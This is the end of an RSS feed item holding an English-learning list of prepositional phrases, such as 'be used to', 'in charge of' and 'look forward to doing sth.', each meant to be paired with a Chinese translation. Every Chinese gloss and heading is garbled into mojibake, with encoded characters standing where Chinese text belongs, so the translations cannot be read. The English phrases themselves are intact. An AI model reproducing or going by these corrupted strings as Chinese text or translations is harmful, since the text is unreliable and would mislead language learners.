&lt;p&gt;be opposed to åå¯¹ï¼Œä¸èµæˆ                    be opposite to åœ¨â€¦â€¦å¯¹é¢ï¼Œå’Œâ€¦â€¦ç›¸å&lt;/p&gt;
&lt;p&gt;be polite to å¯¹â€¦â€¦æœ‰ç¤¼è²Œ                        be related to ä¸â€¦â€¦æœ‰å…³ï¼ˆæ˜¯äº²æˆšï¼‰&lt;/p&gt;
&lt;p&gt;be respectful to å°Šæ•¬                          be rude to å¯¹â€¦â€¦æ— ç¤¼&lt;/p&gt;
&lt;p&gt;be similar to ä¸â€¦â€¦ç›¸ä¼¼                        be true to å¿ å®äºï¼Œä¿¡å®ˆ&lt;/p&gt;
&lt;p&gt;be used to ä¹ æƒ¯äº                               be useful to å¯¹â€¦â€¦æœ‰ç”¨&lt;/p&gt;
&lt;h2 id=&#34;16ä¸ªå¸¸ç”¨beå½¢å®¹è¯withç»“æ„&#34;&gt;16ä¸ªå¸¸ç”¨â€œbe+å½¢å®¹è¯+withâ€ç»“æ„&lt;/h2&gt;
&lt;p&gt;be angry with å¯¹ï¼ˆæŸäººï¼‰ç”Ÿæ°”                  be bored with å¯¹â€¦â€¦åŒçƒ¦&lt;/p&gt;
&lt;p&gt;be busy with å¿™äº                                be careful with å°å¿ƒ&lt;/p&gt;
&lt;p&gt;be concerned with å…³äºï¼Œä¸â€¦â€¦æœ‰å…³           be content with ä»¥â€¦â€¦ä¸ºæ»¡è¶³&lt;/p&gt;
&lt;p&gt;be delighted with å¯¹â€¦â€¦æ„Ÿåˆ°é«˜å…´               be disappointed with å¯¹ï¼ˆæŸäººï¼‰å¤±æœ›&lt;/p&gt;
&lt;p&gt;be familiar with ç†Ÿæ‚‰ï¼Œç²¾é€š                     be honest with å¯¹ï¼ˆæŸäººï¼‰çœŸè¯š&lt;/p&gt;
&lt;p&gt;be ill with æ‚£â€¦â€¦ç—…                                be patient with å¯¹ï¼ˆæŸäººï¼‰æœ‰è€å¿ƒ&lt;/p&gt;
&lt;p&gt;be pleased with å¯¹â€¦â€¦æ»¡æ„ï¼ˆé«˜å…´ï¼‰            be popular with å—â€¦â€¦æ¬¢è¿&lt;/p&gt;
&lt;p&gt;be satisfied with å¯¹â€¦â€¦æ»¡æ„                     be strict with å¯¹ï¼ˆæŸäººï¼‰ä¸¥æ ¼&lt;/p&gt;
&lt;h2 id=&#34;24ä¸ªå¸¸ç”¨inå…¶ä»–è¯ofç»“æ„&#34;&gt;24ä¸ªå¸¸ç”¨â€œin+å…¶ä»–è¯+ofâ€ç»“æ„&lt;/h2&gt;
&lt;p&gt;in advance of åœ¨â€¦â€¦å‰é¢                       in aid of å¸®åŠ©&lt;/p&gt;
&lt;p&gt;in behalf of ä¸ºäº†ï¼Œä¸ºäº†â€¦â€¦çš„åˆ©ç›Š             in case of å¦‚æœï¼Œä¸‡ä¸€ï¼Œä»¥é˜²&lt;/p&gt;
&lt;p&gt;in celebration of åº†ç¥                          in charge of è´Ÿè´£ï¼Œç®¡ç†&lt;/p&gt;
&lt;p&gt;in commemoration of çºªå¿µï¼Œåº†ç¥            in defence of ä¿å«&lt;/p&gt;
&lt;p&gt;in explanation of è§£é‡Š                          in face of é¢å¯¹&lt;/p&gt;
&lt;p&gt;in favour of èµæˆï¼Œä¸»å¼                          in front of åœ¨â€¦â€¦å‰é¢&lt;/p&gt;
&lt;p&gt;in honor of çºªå¿µï¼Œç¥è´ºï¼Œæ¬¢è¿                 in memory of çºªå¿µ&lt;/p&gt;
&lt;p&gt;in need of éœ€è¦                                  in place of ä»£æ›¿&lt;/p&gt;
&lt;p&gt;in possession of æ‹¥æœ‰                          in praise of ç§°èµ&lt;/p&gt;
&lt;p&gt;in respect of å…³äºï¼Œå°±â€¦â€¦è€Œè¨€                 in search of å¯»æ‰¾ï¼Œæœæ‰¾&lt;/p&gt;
&lt;p&gt;in sight of çœ‹å¾—è§ï¼Œåœ¨çœ‹è§â€¦â€¦çš„åœ°æ–¹         in spite of è™½ç„¶ï¼Œå°½ç®¡&lt;/p&gt;
&lt;p&gt;in support of ä¸ºäº†æ”¯æŒï¼ˆæ‹¥æŠ¤ï¼‰â€¦â€¦           in view of é‰´äºï¼Œè€ƒè™‘åˆ°&lt;/p&gt;
&lt;p&gt;æ³¨ï¼šåŒæ—¶æ³¨æ„ä¸€ä¸‹ç›¸ä¼¼ç»“æ„ï¼š&lt;/p&gt;
&lt;p&gt;in exchange for ä½œä¸ºå¯¹â€¦â€¦çš„äº¤æ¢             in preparation for ä¸ºâ€¦â€¦ä½œå‡†å¤‡&lt;/p&gt;
&lt;p&gt;in return for ä½œä¸ºâ€¦â€¦çš„æŠ¥ç­”                   in reward for ä½œä¸ºâ€¦â€¦çš„æŠ¥é…¬&lt;/p&gt;
&lt;p&gt;in addition to åŠ ä¹‹ï¼Œé™¤â€¦â€¦ä¹‹å¤–               in answer to å›ç­”ï¼Œå“åº”&lt;/p&gt;
&lt;p&gt;in contrast to [with] ä¸â€¦â€¦å½¢æˆå¯¹æ¯”         in opposition to ä¸â€¦â€¦ç›¸åï¼Œåå¯¹&lt;/p&gt;
&lt;p&gt;in reply to ä½œä¸ºå¯¹â€¦â€¦çš„å›ç­”ï¼ˆç­”å¤ï¼‰         in response to å›ç­”ï¼Œå“åº”&lt;/p&gt;
&lt;p&gt;in [with] reference to å…³äº                   in [with] regard to å…³äº&lt;/p&gt;
&lt;h2 id=&#34;27ä¸ªå¸¦to-doing-sthçš„å¸¸ç”¨ç»“æ„&#34;&gt;27ä¸ªå¸¦to doing sth.çš„å¸¸ç”¨ç»“æ„&lt;/h2&gt;
&lt;p&gt;1ï¼åŠ¨è¯+ä»‹è¯to+åŠ¨åè¯&lt;/p&gt;
&lt;p&gt;(1) admit to doing sth. æ‰¿è®¤åšäº†æŸäº‹&lt;/p&gt;
&lt;p&gt;(2) apply to doing sth. é€‚ç”¨äºåšæŸäº‹&lt;/p&gt;
&lt;p&gt;(3) object to doing sth. åå¯¹åšæŸäº‹&lt;/p&gt;
&lt;p&gt;(4) see to doing sth. è´Ÿè´£åšæŸäº‹&lt;/p&gt;
&lt;p&gt;(5) stick to doing sth. åšæŒåšæŸäº‹&lt;/p&gt;
&lt;p&gt;(6) take to doing sth. å–œæ¬¢ä¸ŠåšæŸäº‹ï¼Œé€æ¸ä¹ æƒ¯åšæŸäº‹&lt;/p&gt;
&lt;p&gt;2ï¼åŠ¨è¯+å®¾è¯­+ä»‹è¯to+åŠ¨åè¯&lt;/p&gt;
&lt;p&gt;(1) apply oneself to doing sth. ä¸“å¿ƒè‡´åŠ›äºåšæŸäº‹&lt;/p&gt;
&lt;p&gt;(2) devote sth. to doing sth. æŠŠâ€¦â€¦çŒ®ç»™åšæŸäº‹&lt;/p&gt;
&lt;p&gt;(3) devote oneself to doing sth. çŒ®èº«äºåšæŸäº‹&lt;/p&gt;
&lt;p&gt;(4) limit sth. to doing sth. æŠŠâ€¦â€¦é™åˆ¶åœ¨åšæŸäº‹çš„èŒƒå›´å†…&lt;/p&gt;
&lt;p&gt;(5) reduce sb. to doing sth. ä½¿æŸäººæ²¦ä¸ºåšæŸäº‹&lt;/p&gt;
&lt;p&gt;3ï¼åŠ¨è¯+åè¯+ä»‹è¯to+åŠ¨åè¯&lt;/p&gt;
&lt;p&gt;(1) give oneâ€™s life to doing sth. çŒ®èº«äºåšæŸäº‹&lt;/p&gt;
&lt;p&gt;(2) give oneâ€™s mind to doing sth. ä¸“å¿ƒåšæŸäº‹&lt;/p&gt;
&lt;p&gt;(3) have a dislike to doing sth. åŒæ¶åšæŸäº‹&lt;/p&gt;
&lt;p&gt;(4) have an eye to doing sth. æ³¨æ„åšæŸäº‹&lt;/p&gt;
&lt;p&gt;(5) have an objection to doing sth. åå¯¹ï¼ˆåæ„Ÿï¼‰åšæŸäº‹&lt;/p&gt;
&lt;p&gt;(6) pay attention to doing sth. æ³¨æ„åšæŸäº‹&lt;/p&gt;
&lt;p&gt;(7) set oneâ€™s mind to doing sth. å†³å¿ƒåšæŸäº‹&lt;/p&gt;
&lt;p&gt;4ï¼be+å½¢å®¹è¯+ä»‹è¯to+åŠ¨åè¯&lt;/p&gt;
&lt;p&gt;(1) be equal to doing sth. ç­‰äºåšæŸäº‹ï¼Œèƒ½èƒœä»»åšæŸäº‹&lt;/p&gt;
&lt;p&gt;(2) be used to doing sth. ä¹ æƒ¯äºåšæŸäº‹&lt;/p&gt;
&lt;p&gt;(3) be opposed to doing sth. åå¯¹åšæŸäº‹&lt;/p&gt;
&lt;p&gt;(4) be reduced to doing sth. ä½¿æŸäººæ²¦ä¸ºåšæŸäº‹&lt;/p&gt;
&lt;p&gt;(5) be devoted to doing sth. æŠŠæ—¶é—´ï¼ˆé’±ï¼Œç²¾åŠ›ç­‰ï¼‰çŒ®ç»™åšæŸäº‹&lt;/p&gt;
&lt;p&gt;(6) be limited to doing sth. æŠŠâ€¦â€¦é™åˆ¶åœ¨åšæŸäº‹çš„èŒƒå›´å†…&lt;/p&gt;
&lt;p&gt;5ï¼å…¶ä»–ç»“æ„+ä»‹è¯to+åŠ¨åè¯&lt;/p&gt;
&lt;p&gt;(1) get down to doing sth. å¼€å§‹åšæŸäº‹ï¼Œè®¤çœŸå¤„ç†æŸäº‹&lt;/p&gt;
&lt;p&gt;(2) look forward to doing sth. ç›¼æœ›åšæŸäº‹&lt;/p&gt;
&lt;p&gt;(3) What do you say to doing sth? ä½ è®¤ä¸ºåšæŸäº‹å¦‚ä½•ï¼Ÿ&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
